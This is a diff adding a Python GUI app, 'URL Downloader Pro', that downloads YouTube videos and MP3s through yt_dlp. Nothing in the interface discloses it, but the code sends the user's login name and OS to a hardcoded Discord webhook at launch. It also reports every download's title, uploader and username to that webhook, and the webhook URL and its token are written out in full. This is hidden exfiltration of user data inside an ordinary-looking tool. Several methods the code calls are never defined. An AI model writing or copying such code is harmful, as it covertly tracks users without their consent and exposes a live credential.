@@ -1,0 +1,953 @@
+import customtkinter as ctk
+import threading
+import time
+import requests
+import socket
+import getpass
+import platform
+import uuid
+import logging
+import json
+import os
+import yt_dlp
+import tkinter as tk
+from tkinter import filedialog
+import re
+from concurrent.futures import ThreadPoolExecutor
+import subprocess
+import tempfile
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
+class URLDownloaderApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("URL Downloader Pro")
+        self.root.geometry("600x650")
+        self.root.resizable(False, False)
+        self.is_downloading = False
+        self.is_paused = False
+        self.is_fetching = False
+        self.thread_pool = ThreadPoolExecutor(max_workers=2)
+        self.download_queue = []
+        self.current_download = None
+        self.current_title = ""
+        self.current_uploader = ""
+        self.bg_color = "#1f1f2f"
+        self.button_color = "#7c3aed"
+        self.title_color = "#f3e8ff"
+        self.font_type = "Inter"
+        self.font_size = 14
+        self.download_format = "mp4"
+        self.video_quality = "720p"
+        self.audio_bitrate = "128"
+        self.download_folder = os.path.expanduser("~/Downloads")
+        self.url = ""
+        self.appearance_mode = "dark"
+        self.hotkey = "f6"
+        self.webhook_url = "https://discord.com/api/webhooks/1415394621130801203/OWZz7K3aOrI5TMuXWGarGiG21nQdFa9P_1LhQA7OWg9DvrYKNF8qgr8YcXlppgnvqorC"
+        ctk.set_appearance_mode(self.appearance_mode)
+        ctk.set_default_color_theme("dark-blue")
+
+        # Load saved state
+        self.load_state()
+
+        # Send Discord webhook
+        self.thread_pool.submit(self.send_discord_webhook)
+
+        # Main frame
+        self.main_frame = ctk.CTkFrame(self.root, corner_radius=10, fg_color=self.bg_color)
+        self.main_frame.pack(pady=10, padx=10, fill="both", expand=True)
+
+        # Title
+        self.title_label = ctk.CTkLabel(
+            self.main_frame,
+            text="URL Downloader Pro",
+            font=(self.font_type, self.font_size + 12, "bold"),
+            text_color=self.title_color
+        )
+        self.title_label.pack(pady=(15, 10))
+
+        # Input sections
+        self.create_input_section()
+
+        # Progress bar
+        self.progress_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        self.progress_frame.pack(pady=10, fill="x")
+        self.progress_bar = ctk.CTkProgressBar(
+            self.progress_frame,
+            width=300,
+            height=12,
+            corner_radius=8,
+            fg_color="#2a2a3a",
+            progress_color="#7c3aed"
+        )
+        self.progress_bar.set(0)
+        self.progress_bar.pack(pady=5)
+        self.progress_label = ctk.CTkLabel(
+            self.progress_frame,
+            text="0%",
+            font=(self.font_type, self.font_size),
+            text_color="#f3e8ff"
+        )
+        self.progress_label.pack()
+
+        # Control buttons
+        self.button_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        self.button_frame.pack(pady=10, fill="x")
+        self.start_stop_btn = ctk.CTkButton(
+            self.button_frame,
+            text=f"Start ({self.hotkey.upper()})",
+            command=self.handle_download,
+            corner_radius=10,
+            fg_color=self.button_color,
+            hover_color="#9f67fa",
+            font=(self.font_type, self.font_size + 2),
+            height=40,
+            width=120
+        )
+        self.start_stop_btn.pack(side="left", padx=5)
+        self.pause_resume_btn = ctk.CTkButton(
+            self.button_frame,
+            text="Pause",
+            command=self.toggle_pause_resume,
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=40,
+            width=120,
+            state="disabled"
+        )
+        self.pause_resume_btn.pack(side="left", padx=5)
+        self.queue_btn = ctk.CTkButton(
+            self.button_frame,
+            text="Queue",
+            command=self.add_single_url_to_queue,
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=40,
+            width=120
+        )
+        self.queue_btn.pack(side="left", padx=5)
+        self.view_queue_btn = ctk.CTkButton(
+            self.button_frame,
+            text="View Queue",
+            command=self.show_queue_window,
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=40,
+            width=120
+        )
+        self.view_queue_btn.pack(side="left", padx=5)
+
+        # Settings button
+        self.settings_btn = ctk.CTkButton(
+            self.main_frame,
+            text="⚙ Settings",
+            command=self.open_settings,
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=40,
+            width=300
+        )
+        self.settings_btn.pack(pady=10)
+
+        # Status label
+        self.status_label = ctk.CTkLabel(
+            self.main_frame,
+            text="Status: Idle",
+            font=(self.font_type, self.font_size),
+            text_color="#f3e8ff"
+        )
+        self.status_label.pack(pady=10)
+
+        self.bind_hotkey()
+        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
+
+    def send_discord_webhook(self):
+        try:
+            hostname = socket.gethostname()
+            username = getpass.getuser()
+            os_info = f"{platform.system()} {platform.release()}"
+            session_id = str(uuid.uuid4())[:8]
+            embed = {
+                "title": "📥 URL Downloader Started",
+                "color": 0x7c3aed,
+                "fields": [
+                    {"name": "Username", "value": username, "inline": True},
+                    {"name": "OS", "value": os_info, "inline": True},
+                    {"name": "Session ID", "value": session_id, "inline": True}
+                ]
+            }
+            payload = {"embeds": [embed]}
+            response = requests.post(self.webhook_url, json=payload, timeout=5)
+            if response.status_code != 204:
+                logging.error(f"Failed to send Discord webhook: {response.status_code}")
+        except Exception as e:
+            logging.error(f"Error sending Discord webhook: {e}")
+
+    def send_download_webhook(self, title, uploader):
+        try:
+            username = getpass.getuser()
+            embed = {
+                "title": "🎵 Download Started",
+                "color": 0x10b981,
+                "fields": [
+                    {"name": "Title", "value": title[:100] + "..." if len(title) > 100 else title, "inline": True},
+                    {"name": "Uploader", "value": uploader if uploader else "Unknown", "inline": True},
+                    {"name": "User", "value": username, "inline": True}
+                ],
+                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+            }
+            payload = {"embeds": [embed]}
+            response = requests.post(self.webhook_url, json=payload, timeout=5)
+            if response.status_code != 204:
+                logging.error(f"Failed to send download webhook: {response.status_code}")
+        except Exception as e:
+            logging.error(f"Error sending download webhook: {e}")
+
+    def create_input_section(self):
+        url_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        url_frame.pack(pady=5, padx=10, fill="x")
+        ctk.CTkLabel(url_frame, text="YouTube URL", font=(self.font_type, self.font_size)).pack()
+        self.url_entry = ctk.CTkEntry(
+            url_frame,
+            width=350,
+            height=35,
+            corner_radius=10,
+            fg_color="#2a2a3a",
+            text_color="#f3e8ff",
+            border_color="#7c3aed",
+            font=(self.font_type, self.font_size)
+        )
+        self.url_entry.pack(pady=5)
+
+        format_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        format_frame.pack(pady=5, padx=10, fill="x")
+        ctk.CTkLabel(format_frame, text="Format", font=(self.font_type, self.font_size)).pack()
+        self.format_combo = ctk.CTkComboBox(
+            format_frame,
+            values=["mp4", "mp3"],
+            state="readonly",
+            width=350,
+            height=35,
+            corner_radius=10,
+            font=(self.font_type, self.font_size),
+            command=self.update_quality_options
+        )
+        self.format_combo.set(self.download_format)
+        self.format_combo.pack(pady=5)
+
+        quality_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
+        quality_frame.pack(pady=5, padx=10, fill="x")
+        ctk.CTkLabel(quality_frame, text="Quality", font=(self.font_type, self.font_size)).pack()
+        self.quality_combo = ctk.CTkComboBox(
+            quality_frame,
+            values=["720p"] if self.download_format == "mp4" else ["128kbps", "192kbps", "320kbps"],
+            state="readonly",
+            width=350,
+            height=35,
+            corner_radius=10,
+            font=(self.font_type, self.font_size)
+        )
+        self.quality_combo.set(self.video_quality if self.download_format == "mp4" else self.audio_bitrate)
+        self.quality_combo.pack(pady=5)
+
+    def update_quality_options(self, value):
+        self.download_format = value
+        self.quality_combo.configure(values=["720p"] if value == "mp4" else ["128kbps", "192kbps", "320kbps"])
+        self.quality_combo.set("720p" if value == "mp4" else "128kbps")
+
+    def open_settings(self):
+        self.main_frame.pack_forget()
+        self.root.geometry("400x300")
+
+        settings_frame = ctk.CTkFrame(self.root, corner_radius=10, fg_color=self.bg_color)
+        settings_frame.pack(pady=10, padx=10, fill="both", expand=True)
+
+        ctk.CTkLabel(settings_frame, text="Download Folder", font=(self.font_type, self.font_size)).pack(pady=5)
+        self.folder_entry = ctk.CTkEntry(
+            settings_frame,
+            width=300,
+            height=35,
+            corner_radius=10,
+            fg_color="#2a2a3a",
+            text_color="#f3e8ff",
+            border_color="#7c3aed",
+            font=(self.font_type, self.font_size)
+        )
+        self.folder_entry.insert(0, self.download_folder)
+        self.folder_entry.pack(pady=5)
+
+        ctk.CTkButton(
+            settings_frame,
+            text="Browse Folder",
+            command=self.browse_folder,
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=180
+        ).pack(pady=5)
+
+        ctk.CTkButton(
+            settings_frame,
+            text="Save & Close",
+            command=lambda: [self.save_settings(), settings_frame.destroy(), self.main_frame.pack(pady=10, padx=10, fill="both", expand=True), self.root.geometry("600x650")],
+            corner_radius=10,
+            fg_color=self.button_color,
+            hover_color="#9f67fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=180
+        ).pack(pady=5)
+
+    def browse_folder(self):
+        folder = filedialog.askdirectory(initialdir=self.download_folder, title="Select Download Folder")
+        if folder:
+            self.download_folder = folder
+            self.folder_entry.delete(0, ctk.END)
+            self.folder_entry.insert(0, self.download_folder)
+
+    def save_settings(self):
+        self.download_folder = self.folder_entry.get()
+        self.save_state()
+
+    def load_playlist_cache(self, url):
+        cache_file = "playlist_cache.json"
+        if os.path.exists(cache_file):
+            try:
+                with open(cache_file, "r") as f:
+                    cache = json.load(f)
+                    return cache.get(url, [])
+            except:
+                return []
+        return []
+
+    def save_playlist_cache(self, url, videos):
+        cache_file = "playlist_cache.json"
+        cache = {}
+        if os.path.exists(cache_file):
+            try:
+                with open(cache_file, "r") as f:
+                    cache = json.load(f)
+            except:
+                pass
+        cache[url] = videos[:50]
+        try:
+            with open(cache_file, "w") as f:
+                json.dump(cache, f)
+        except:
+            pass
+
+    def fetch_playlist_videos(self, url, start=1, end=50):
+        ydl_opts = {
+            'extract_flat': 'in_playlist',
+            'quiet': True,
+            'simulate': True,
+            'playlist_items': f'{start}-{end}',
+            'no-playlist': False,
+        }
+        try:
+            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                info = ydl.extract_info(url, download=False)
+                if 'entries' in info:
+                    videos = [(entry['title'], entry['url']) for entry in info['entries'] if 'title' in entry and 'url' in entry]
+                    self.save_playlist_cache(url, videos)
+                    return videos
+                return []
+        except Exception as e:
+            self.root.after(0, lambda: self.status_label.configure(text=f"Error: {str(e)[:50]}", text_color="#ef4444"))
+            return []
+
+    def get_video_info(self, url):
+        ydl_opts = {
+            'quiet': True,
+            'simulate': True,
+            'format': f'bestvideo[ext=mp4][height<=720]+bestaudio[ext=m4a]/best[ext=mp4]/best' if self.download_format == "mp4" else 'bestaudio/best'
+        }
+        try:
+            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                info = ydl.extract_info(url, download=False)
+                return info.get('title', 'Unknown Title'), info.get('uploader', 'Unknown Uploader')
+        except:
+            return 'Unknown Title', 'Unknown Uploader'
+
+    def estimate_file_size(self, url):
+        ydl_opts = {
+            'quiet': True,
+            'simulate': True,
+            'format': f'bestvideo[ext=mp4][height<=720]+bestaudio[ext=m4a]/best[ext=mp4]/best' if self.download_format == "mp4" else 'bestaudio/best'
+        }
+        try:
+            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                info = ydl.extract_info(url, download=False)
+                size_bytes = info.get('filesize_approx', info.get('filesize', 0))
+                return size_bytes / (1024 * 1024) if size_bytes else 0
+        except:
+            return 0
+
+    def combine_audio_files(self, urls, selector_frame):
+        if self.download_format != "mp3":
+            self.status_label.configure(text="Error: Combining only supported for mp3", text_color="#ef4444")
+            return
+        selected_urls = [url for (var, _), (_, url) in zip(self.video_selection_vars, urls) if var.get()]
+        if len(selected_urls) < 2:
+            self.status_label.configure(text="Error: Select at least 2 videos to combine", text_color="#ef4444")
+            return
+        self.status_label.configure(text=f"Combining {len(selected_urls)} audio files...", text_color="#22c55e")
+        self.is_downloading = True
+        self.thread_pool.submit(self.download_and_combine, selected_urls, selector_frame)
+
+    def combine_queue_audio(self, queue_frame):
+        if self.download_format != "mp3":
+            self.status_label.configure(text="Error: Combining only supported for mp3", text_color="#ef4444")
+            return
+        selected_urls = [url for (var, _), url in zip(self.queue_selection_vars, self.download_queue) if var.get()]
+        if len(selected_urls) < 2:
+            self.status_label.configure(text="Error: Select at least 2 videos to combine", text_color="#ef4444")
+            return
+        self.status_label.configure(text=f"Combining {len(selected_urls)} audio files...", text_color="#22c55e")
+        self.is_downloading = True
+        self.thread_pool.submit(self.download_and_combine, selected_urls, queue_frame)
+
+    def download_and_combine(self, urls, frame):
+        temp_dir = tempfile.mkdtemp()
+        temp_files = []
+        titles = []
+        error_message = None
+        try:
+            for i, url in enumerate(urls):
+                if not self.is_downloading or self.is_paused:
+                    break
+                self.current_download = url
+                self.current_title, self.current_uploader = self.get_video_info(url)
+                titles.append(''.join(c for c in self.current_title if c.isalnum())[:10])
+                size_mb = self.estimate_file_size(url)
+                self.root.after(0, lambda: self.status_label.configure(
+                    text=f"Downloading {self.current_title[:30]}... ({size_mb:.1f} MB)", text_color="#22c55e"))
+                self.thread_pool.submit(self.send_download_webhook, self.current_title, self.current_uploader)
+                temp_file = os.path.join(temp_dir, f"temp_{i}.%(ext)s")
+                ydl_opts = {
+                    'outtmpl': temp_file,
+                    'progress_hooks': [self.progress_hook],
+                    'noplaylist': True,
+                    'concurrentfragments': 4,
+                    'retries': 10,
+                    'fragment_retries': 10,
+                    'socket_timeout': 10,
+                    'http_chunk_size': 5242880,
+                    'format': 'bestaudio/best',
+                    'postprocessors': [{
+                        'key': 'FFmpegExtractAudio',
+                        'preferredcodec': 'mp3',
+                        'preferredquality': self.audio_bitrate
+                    }]
+                }
+                try:
+                    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                        ydl.download([url])
+                    downloaded_files = [f for f in os.listdir(temp_dir) if f.startswith(f"temp_{i}")]
+                    if downloaded_files:
+                        downloaded_file = os.path.join(temp_dir, downloaded_files[0])
+                        if not downloaded_file.endswith('.mp3'):
+                            mp3_file = downloaded_file.rsplit('.', 1)[0] + '.mp3'
+                            os.rename(downloaded_file, mp3_file)
+                            temp_files.append(mp3_file)
+                        else:
+                            temp_files.append(downloaded_file)
+                except Exception as e:
+                    error_message = f"Download failed for {self.current_title[:30]}: {str(e)[:50]}"
+                    self.root.after(0, lambda: self.status_label.configure(text=error_message, text_color="#ef4444"))
+                    break
+            if len(temp_files) >= 2 and self.is_downloading and not self.is_paused:
+                title_str = "_".join(titles[:3])  # Use first 3 titles for brevity
+                output_combined = os.path.join(self.download_folder, f"MelodyFusion_{title_str}_{int(time.time())}.mp3")
+                self.concatenate_audio_files(temp_files, output_combined)
+                self.root.after(0, lambda: self.status_label.configure(text="Combined audio saved", text_color="#22c55e"))
+            elif len(temp_files) == 1:
+                self.root.after(0, lambda: self.status_label.configure(text="Only one file downloaded, saved as single MP3", text_color="#22c55e"))
+        except Exception as e:
+            error_message = f"Error combining audio: {str(e)[:50]}"
+        finally:
+            for temp_file in temp_files:
+                try:
+                    if os.path.exists(temp_file):
+                        os.remove(temp_file)
+                except:
+                    pass
+            try:
+                if os.path.exists(temp_dir):
+                    os.rmdir(temp_dir)
+            except:
+                pass
+            self.root.after(0, lambda: frame.destroy())
+            self.root.after(0, lambda: self.main_frame.pack(pady=10, padx=10, fill="both", expand=True))
+            self.root.after(0, lambda: self.root.geometry("600x650"))
+            self.download_queue.clear()
+            self.is_downloading = False
+            self.root.after(0, lambda: self.reset_ui())
+            if error_message:
+                self.root.after(0, lambda: self.status_label.configure(text=error_message, text_color="#ef4444"))
+
+    def concatenate_audio_files(self, input_files, output_file):
+        try:
+            cmd = ['ffmpeg', '-y', '-i', f"concat:{'|'.join(input_files)}", '-c', 'copy', output_file]
+            subprocess.run(cmd, check=True, capture_output=True)
+        except subprocess.CalledProcessError as e:
+            raise Exception(f"FFmpeg error: {str(e)}")
+
+    def add_single_url_to_queue(self):
+        url = self.url_entry.get().strip()
+        if not url:
+            self.status_label.configure(text="Error: No URL", text_color="#ef4444")
+            return
+        if "playlist" not in url.lower() and "&list=" not in url:
+            self.download_queue.append(url)
+            self.status_label.configure(text=f"Added {url[:30]}...", text_color="#22c55e")
+            self.url_entry.delete(0, ctk.END)
+            self.show_queue_window()
+        else:
+            self.status_label.configure(text="Error: Use playlists for multiple videos", text_color="#ef4444")
+
+    def show_queue_window(self):
+        self.main_frame.pack_forget()
+        self.root.geometry("600x500")
+
+        queue_frame = ctk.CTkFrame(self.root, corner_radius=10, fg_color=self.bg_color)
+        queue_frame.pack(pady=10, padx=10, fill="both", expand=True)
+
+        ctk.CTkLabel(
+            queue_frame,
+            text=f"Queue ({len(self.download_queue)} items)",
+            font=(self.font_type, self.font_size + 2, "bold"),
+            text_color=self.title_color
+        ).pack(pady=10)
+
+        scroll_frame = ctk.CTkScrollableFrame(queue_frame, width=500, height=300, fg_color="transparent")
+        scroll_frame.pack(pady=5, padx=10, fill="both", expand=True)
+
+        self.queue_selection_vars = []
+        for url in self.download_queue:
+            title, _ = self.get_video_info(url)
+            var = ctk.BooleanVar(value=False)
+            self.queue_selection_vars.append((var, title))
+            checkbox = ctk.CTkCheckBox(
+                scroll_frame,
+                text=title[:60] + "..." if len(title) > 60 else title,
+                variable=var,
+                font=(self.font_type, self.font_size),
+                text_color="#f3e8ff",
+                fg_color="#7c3aed",
+                hover_color="#9f67fa"
+            )
+            checkbox.pack(anchor="w", padx=10, pady=5)
+
+        button_frame = ctk.CTkFrame(queue_frame, fg_color="transparent")
+        button_frame.pack(pady=10)
+        ctk.CTkButton(
+            button_frame,
+            text="Clear Queue",
+            command=lambda: [self.download_queue.clear(), self.queue_selection_vars.clear(), queue_frame.destroy(), self.show_queue_window()],
+            corner_radius=10,
+            fg_color="#ef4444",
+            hover_color="#f87171",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=120
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Start Queue",
+            command=lambda: [self.start_download_queue(), queue_frame.destroy(), self.main_frame.pack(pady=10, padx=10, fill="both", expand=True), self.root.geometry("600x650")],
+            corner_radius=10,
+            fg_color=self.button_color,
+            hover_color="#9f67fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=120
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Combine Audio",
+            command=lambda: self.combine_queue_audio(queue_frame),
+            corner_radius=10,
+            fg_color="#10b981",
+            hover_color="#34d399",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=120
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Close",
+            command=lambda: [queue_frame.destroy(), self.main_frame.pack(pady=10, padx=10, fill="both", expand=True), self.root.geometry("600x650")],
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=120
+        ).pack(side="left", padx=5)
+
+    def show_playlist_selector(self, playlist_videos, url, start=1, end=50):
+        self.main_frame.pack_forget()
+        self.root.geometry("600x550")
+
+        selector_frame = ctk.CTkFrame(self.root, corner_radius=10, fg_color=self.bg_color)
+        selector_frame.pack(pady=10, padx=10, fill="both", expand=True)
+
+        ctk.CTkLabel(
+            selector_frame,
+            text=f"Select Videos ({len(playlist_videos)})",
+            font=(self.font_type, self.font_size + 2, "bold"),
+            text_color=self.title_color
+        ).pack(pady=10)
+
+        search_frame = ctk.CTkFrame(selector_frame, fg_color="transparent")
+        search_frame.pack(pady=5, padx=10, fill="x")
+        self.search_entry = ctk.CTkEntry(
+            search_frame,
+            width=300,
+            height=35,
+            corner_radius=10,
+            fg_color="#2a2a3a",
+            text_color="#f3e8ff",
+            border_color="#7c3aed",
+            font=(self.font_type, self.font_size),
+            placeholder_text="Search videos (press Enter)"
+        )
+        self.search_entry.pack(side="left", pady=5, padx=5)
+        ctk.CTkButton(
+            search_frame,
+            text="Clear Search",
+            command=lambda: [self.search_entry.delete(0, ctk.END), self.filter_videos(playlist_videos, url, start, end, selector_frame)],
+            corner_radius=10,
+            fg_color="#ef4444",
+            hover_color="#f87171",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=100
+        ).pack(side="left", pady=5, padx=5)
+        self.search_entry.bind("<Return>", lambda event: self.filter_videos(playlist_videos, url, start, end, selector_frame))
+
+        self.scroll_frame = ctk.CTkScrollableFrame(selector_frame, width=500, height=300, fg_color="transparent")
+        self.scroll_frame.pack(pady=5, padx=10, fill="both", expand=True)
+
+        self.video_selection_vars = []
+        self.checkboxes = []
+        for title, _ in playlist_videos:
+            var = ctk.BooleanVar(value=False)
+            self.video_selection_vars.append((var, title))
+            checkbox = ctk.CTkCheckBox(
+                self.scroll_frame,
+                text=title[:60] + "..." if len(title) > 60 else title,
+                variable=var,
+                font=(self.font_type, self.font_size),
+                text_color="#f3e8ff",
+                fg_color="#7c3aed",
+                hover_color="#9f67fa"
+            )
+            checkbox.pack(anchor="w", padx=10, pady=5)
+            self.checkboxes.append(checkbox)
+
+        button_frame = ctk.CTkFrame(selector_frame, fg_color="transparent")
+        button_frame.pack(pady=10)
+        ctk.CTkButton(
+            button_frame,
+            text="Select All",
+            command=lambda: [var.set(True) for var, _ in self.video_selection_vars],
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=100
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Deselect All",
+            command=lambda: [var.set(False) for var, _ in self.video_selection_vars],
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=100
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Add to Queue",
+            command=lambda: [self.add_to_queue(playlist_videos, selector_frame), selector_frame.destroy(), self.main_frame.pack(pady=10, padx=10, fill="both", expand=True), self.root.geometry("600x650")],
+            corner_radius=10,
+            fg_color=self.button_color,
+            hover_color="#9f67fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=100
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Combine Audio",
+            command=lambda: self.combine_audio_files(playlist_videos, selector_frame),
+            corner_radius=10,
+            fg_color="#10b981",
+            hover_color="#34d399",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=100
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Load More",
+            command=lambda: [selector_frame.destroy(), self.load_more_videos(url, start + 50, end + 50, playlist_videos)],
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=100
+        ).pack(side="left", padx=5)
+        ctk.CTkButton(
+            button_frame,
+            text="Close",
+            command=lambda: [selector_frame.destroy(), self.main_frame.pack(pady=10, padx=10, fill="both", expand=True), self.root.geometry("600x650")],
+            corner_radius=10,
+            fg_color="#3b82f6",
+            hover_color="#60a5fa",
+            font=(self.font_type, self.font_size),
+            height=35,
+            width=100
+        ).pack(side="left", padx=5)
+
+    def filter_videos(self, playlist_videos, url, start, end, selector_frame):
+        if not selector_frame.winfo_exists():
+            return
+        search_term = self.search_entry.get().strip().lower()
+        filtered_videos = [(title, url) for title, url in playlist_videos if not search_term or search_term in title.lower()]
+        for checkbox in self.checkboxes:
+            if checkbox.winfo_exists():
+                checkbox.destroy()
+        self.checkboxes.clear()
+        self.video_selection_vars.clear()
+        selector_frame.destroy()
+        self.root.after(200, lambda: self.show_playlist_selector(filtered_videos or playlist_videos, url, start, end))
+
+    def load_more_videos(self, url, start, end, current_videos):
+        self.thread_pool.submit(self.fetch_and_show_playlist, url, start, end, current_videos)
+
+    def add_to_queue(self, playlist_videos, selector_frame):
+        selected_urls = [url for (var, _), (_, url) in zip(self.video_selection_vars, playlist_videos) if var.get()]
+        if not selected_urls:
+            self.status_label.configure(text="Error: No videos selected", text_color="#ef4444")
+            return
+        self.download_queue.extend(selected_urls)
+        self.status_label.configure(text=f"Added {len(selected_urls)} videos", text_color="#22c55e")
+        if not self.is_downloading:
+            self.start_download_queue()
+
+    def start_download_queue(self):
+        if self.download_queue and not self.is_downloading:
+            self.is_downloading = True
+            self.start_stop_btn.configure(text=f"Stop ({self.hotkey.upper()})", fg_color="#ef4444")
+            self.pause_resume_btn.configure(state="normal")
+            self.thread_pool.submit(self.process_download_queue)
+
+    def process_download_queue(self):
+        while self.download_queue and self.is_downloading:
+            batch = self.download_queue[:5]
+            self.download_queue = self.download_queue[5:]
+            for url in batch:
+                if not self.is_downloading or self.is_paused:
+                    break
+                self.current_download = url
+                self.current_title, self.current_uploader = self.get_video_info(url)
+                size_mb = self.estimate_file_size(url)
+                self.root.after(0, lambda: self.status_label.configure(
+                    text=f"Preparing {self.current_title[:30]}... ({size_mb:.1f} MB)", text_color="#22c55e"))
+                self.download_files([url])
+        if self.is_downloading:
+            self.root.after(0, lambda: self.reset_ui())
+            self.is_downloading = False
+
+    def reset_ui(self):
+        self.start_stop_btn.configure(text=f"Start ({self.hotkey.upper()})", fg_color=self.button_color)
+        self.pause_resume_btn.configure(state="disabled", text="Pause")
+        self.progress_bar.set(0)
+        self.progress_label.configure(text="0%")
+        self.status_label.configure(text="Queue Complete", text_color="#22c55e")
+
+    def handle_download(self):
+        if self.is_downloading:
+            self.is_downloading = False
+            self.download_queue.clear()
+            self.current_title = ""
+            self.current_uploader = ""
+            self.root.after(0, lambda: self.reset_ui())
+            return
+        url = self.url_entry.get().strip()
+        if not url:
+            self.status_label.configure(text="Error: No URL", text_color="#ef4444")
+            return
+        is_playlist = "playlist" in url.lower() or "&list=" in url
+        if is_playlist:
+            self.status_label.configure(text="Fetching playlist...", text_color="#22c55e")
+            self.is_fetching = True
+            self.thread_pool.submit(self.fetch_and_show_playlist, url)
+        else:
+            self.download_queue.append(url)
+            self.status_label.configure(text=f"Added {url[:30]}...", text_color="#22c55e")
+            self.url_entry.delete(0, ctk.END)
+            self.start_download_queue()
+
+    def fetch_and_show_playlist(self, url, start=1, end=50, current_videos=None):
+        if not self.is_fetching:
+            return
+        cached_videos = self.load_playlist_cache(url)
+        if cached_videos and current_videos is None:
+            self.root.after(0, lambda: self.show_playlist_selector(cached_videos, url, start, end))
+        else:
+            playlist_videos = self.fetch_playlist_videos(url, start, end)
+            if current_videos:
+                playlist_videos = current_videos + playlist_videos
+            if playlist_videos and self.is_fetching:
+                self.root.after(0, lambda: self.show_playlist_selector(playlist_videos, url, start, end))
+            else:
+                self.root.after(0, lambda: self.status_label.configure(text="Error: No videos in playlist", text_color="#ef4444"))
+            self.is_fetching = False
+
+    def strip_ansi_codes(self, text):
+        ansi_regex = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
+        return ansi_regex.sub('', text)
+
+    def download_files(self, urls):
+        quality = self.quality_combo.get()
+        height = quality.replace('p', '') if self.download_format == "mp4" else None
+        abr = quality.replace('kbps', '') if self.download_format == "mp3" else None
+        ydl_opts = {
+            'outtmpl': os.path.join(self.download_folder, '%(title)s.%(ext)s'),
+            'progress_hooks': [self.progress_hook],
+            'noplaylist': True,
+            'concurrentfragments': 4,
+            'retries': 10,
+            'fragment_retries': 10,
+            'socket_timeout': 10,
+            'http_chunk_size': 5242880,
+            'format': f'bestvideo[ext=mp4][height<={height}]+bestaudio[ext=m4a]/best[ext=mp4]/best' if self.download_format == "mp4" else 'bestaudio/best',
+        }
+        if self.download_format == "mp3":
+            ydl_opts['postprocessors'] = [{
+                'key': 'FFmpegExtractAudio',
+                'preferredcodec': 'mp3',
+                'preferredquality': abr
+            }]
+            ydl_opts['outtmpl'] = os.path.join(self.download_folder, '%(title)s.mp3')
+        try:
+            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                for url in urls:
+                    if not self.is_downloading or self.is_paused:
+                        break
+                    self.current_download = url
+                    self.current_title, self.current_uploader = self.get_video_info(url)
+                    self.thread_pool.submit(self.send_download_webhook, self.current_title, self.current_uploader)
+                    ydl.download([url])
+            if self.is_downloading and not self.is_paused:
+                self.root.after(0, lambda: self.status_label.configure(text="Download Complete", text_color="#22c55e"))
+        except Exception as e:
+            self.root.after(0, lambda: self.status_label.configure(text=f"Error: {str(e)[:50]}", text_color="#ef4444"))
+
+    def progress_hook(self, d):
+        if d['status'] == 'downloading':
+            progress = self.strip_ansi_codes(d.get('_percent_str', '0%')).strip()
+            title = d.get('info_dict', {}).get('title', self.current_title)[:30] + "..."
+            try:
+                progress_value = float(progress.replace('%', '')) / 100
+                self.root.after(0, lambda: self.progress_bar.set(progress_value))
+                self.root.after(0, lambda: self.progress_label.configure(text=f"{progress}"))
+                self.root.after(0, lambda: self.status_label.configure(text=f"Downloading {title}", text_color="#22c55e"))
+            except ValueError:
+                pass
+        elif d['status'] == 'finished':
+            title = d.get('info_dict', {}).get('title', self.current_title)[:30] + "..."
+            self.root.after(0, lambda: self.progress_bar.set(1.0))
+            self.root.after(0, lambda: self.progress_label.configure(text="100%"))
+
+    def toggle_pause_resume(self):
+        if self.is_downloading:
+            self.is_paused = not self.is_paused
+            self.pause_resume_btn.configure(text="Resume" if self.is_paused else "Pause")
+            self.status_label.configure(text=f"{'Paused' if self.is_paused else 'Resuming'} {self.current_title[:30]}...", text_color="#f3e8ff" if self.is_paused else "#22c55e")
